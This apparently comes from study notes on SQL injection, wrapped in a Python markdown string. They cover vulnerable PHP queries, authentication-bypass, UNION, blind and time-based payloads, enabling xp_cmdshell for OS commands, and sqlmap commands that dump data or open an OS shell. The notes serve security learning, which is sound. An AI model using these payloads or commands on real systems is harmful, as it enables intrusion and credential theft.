# Creating a Markdown file with the improved notes
markdown_content = """
# SQL Theory and Databases

## SQL Injection Attacks  
*May 26, 2024*

SQL Injection (SQLi) is a major vulnerability class in many web applications. It currently ranks third in the OWASP Top 10 Application Security Risks, listed as A03:2021-Injection. SQLi allows attackers to tamper with SQL queries exchanged between the web application and the database, enabling them to extend the original query and access database tables that would normally be inaccessible.

## SQL Theory Refresher  
*May 26, 2024*

Structured Query Language (SQL) was developed specifically to manage and interact with data in relational databases. SQL can be used to query, insert, modify, or delete data, and in some cases, execute operating system commands. SQL instances often provide extensive administrative privileges. Modern web applications are typically designed around a user-facing interface, or frontend, built with technologies like HTML, CSS, and JavaScript.

After interacting with the frontend, data is sent to the backend application layer, running on a server. Various frameworks can be used to build the backend, in languages such as PHP, Java, or Python. The backend code interacts with the database, performing actions such as retrieving the password associated with a given username. SQL syntax and commands vary depending on the relational database used (e.g., MySQL, MariaDB, Microsoft SQL, etc.).

## SQL Injection Example  
*May 28, 2024*

Here’s a simple MySQL query example to retrieve a specific user entry from the `users` table:

```sql
SELECT * FROM users WHERE user_name = 'leon';


This query fetches all data where the user_name is "leon". However, web applications often embed SQL queries in their source code, which can be vulnerable. Consider the following PHP example:

```php
$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password= '$passwd'";
In this case, the user input is inserted directly into the SQL query string without any validation, making it vulnerable to SQL injection. An attacker could manipulate the query by entering leon'+!@#$ into the username field, potentially bypassing authentication mechanisms.

DB Types and Characteristics
Database Variants
May 29, 2024

When testing a web app, we may not know which database is being used. We should be prepared to interact with various SQL database variants, as they differ in syntax, functionality, and features. This section focuses on two common variants: MySQL and Microsoft SQL Server.

MySQL is one of the most widely used databases, alongside its open-source variant, MariaDB.
Microsoft SQL Server integrates natively with the Windows ecosystem and supports querying via the built-in SQLCMD command in Windows.
MySQL Common Commands:
Version: SELECT VERSION();
User info: SELECT SYSTEM_USER();
List of databases: SHOW DATABASES;
To connect to a MySQL database:

```bash
mysql -u root -p'root' -h 192.168.x.x -P 3306
Manual SQL Exploitation
Identifying SQLi via Error-based Payloads
May 30, 2024

In some cases, SQLi can lead to authentication bypass. For instance:

```php
$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
An attacker could force the closure of the uname value and add an OR 1=1 condition:

```sql
SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 -- //

```
The OR 1=1 statement always evaluates to true, bypassing authentication.

## UNION-based SQLi
May 30, 2024

UNION-based SQLi allows the execution of additional SELECT statements in the same query. To perform this attack, the injected UNION query must meet two conditions:

It must have the same number of columns as the original query.
The data types in each column must be compatible.
Example:

```sql
' UNION SELECT database(), user(), @@version, null, null -- //

```
If there’s a mismatch in the number of columns, you can adjust the query like so:

```sql
' UNION SELECT null, null, database(), user(), @@version -- //

```
## Blind SQL Injection
Boolean-based Blind SQLi
May 30, 2024

Blind SQL injections return different results when the query evaluates to TRUE or FALSE, allowing an attacker to infer information from the database. An example of a boolean-based SQLi payload is:

```sql
' AND 1=1 -- // (always true)
In a time-based SQLi, the attacker can use database functions like SLEEP() to measure the server's response time:

```
```sql
' AND IF(1=1, SLEEP(3), 'false') -- //
```
Manual Code Execution
Exploiting MS SQL Server
June 01, 2024

In Microsoft SQL Server, the xp_cmdshell function can execute OS commands. To enable it:

```sql
EXECUTE sp_configure 'show advanced options', 1;  
RECONFIGURE;  
EXECUTE sp_configure 'xp_cmdshell', 1;  
RECONFIGURE;

```
Executing commands:

```sql
EXECUTE xp_cmdshell 'whoami';
Automating the Attack
Using SQLMap

```
June 02, 2024

SQLMap is a tool that automates the identification and exploitation of SQL injection vulnerabilities. Example:

```bash
sqlmap -u "http://example.com/page?param=value" --dump
```
You can also pass a POST request intercepted by Burp Suite:

```bash
sqlmap -r request.txt -p param --os-shell
```
In this example, the tool automates SQL injection and can dump credentials or gain an interactive shell using --os-shell.

##Capstone Lab Exercises
June 03, 2024

SQL Injection in a WordPress Plugin:

Vulnerable plugin: perfect-survey v1.5.1 (CVE-2021-24762).
Exploit example:
```bash
wpscan --url http://target.com/ --enumerate vp
```
Use Hashcat to crack the admin password hash.
Manual SQLi:

Use SQLMap to query and retrieve database content using the mail-list parameter.
Wrapping Up
June 03, 2024

Web applications vulnerable to SQL injection provide various attack vectors, from error-based and UNION-based SQLi to blind and time-based SQLi. Tools like SQLMap simplify these attacks, making it possible to extract credentials, upload shells, or achieve remote code execution